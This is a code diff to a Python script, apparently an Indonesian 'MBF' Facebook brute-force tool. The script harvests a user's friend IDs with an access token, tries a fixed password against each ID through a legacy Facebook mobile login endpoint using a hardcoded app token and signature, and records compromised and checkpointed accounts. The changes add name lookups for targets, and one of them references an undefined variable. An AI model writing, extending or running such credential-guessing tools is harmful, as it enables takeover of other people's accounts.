@@ -130,6 +130,7 @@ def id_teman():
         try:
             req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
             jsl = json.loads(req.text)
+            nama = jsl["name"]
             simpan_id = open("id.txt", "w")
             for ival in jsl['data']:
                 id_konco.append(ival['id'])
@@ -141,7 +142,7 @@ def id_teman():
             print
             print a+"\n  ID Tersimpan " + p + "(" + pu + "id.txt" + p + ")" 
             print 
-            print (h+" [ "+p+"Lanjutkan Bos.."+h+" ]\n")
+            print (h+" [ "+p+"Lanjutkan " + pu + nama +h+" ]\n")
             raw_input(k+ " => ")
             
         except IOError:
@@ -208,8 +209,10 @@ def iqbaldevmbf():
         data_lis = open('id.txt', "r")
         baris = data_lis.read().split()
         while listID:
-            
             user = listID.readline().strip()
+            iqbal = requests.get("https://graph.facebook.com/" + user + "?access_token=" + token)
+            ival = json.loads(iqbal.text)
+            nama_target = ival["name"]
             url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
             Iq_data = urllib.urlopen(url)
             jsl = json.load(Iq_data)
@@ -217,12 +220,12 @@ def iqbaldevmbf():
                 break
                 
             elif "access_token" in jsl:
-                dados.append(h+" [OK] " + pu + user + " | " + a + password)
+                dados.append(h+" [OK] " + pu + user + " | " + a + nama)
                 count += 1
                 
            
             elif "www.facebook.com" in jsl["error_msg"]:
-                gagal.append(m+" [CP] " + d + user + " | " + m + password)
+                gagal.append(m+" [CP] " + d + user + " | " + m + nama)
                 count += 1
                 
             else:
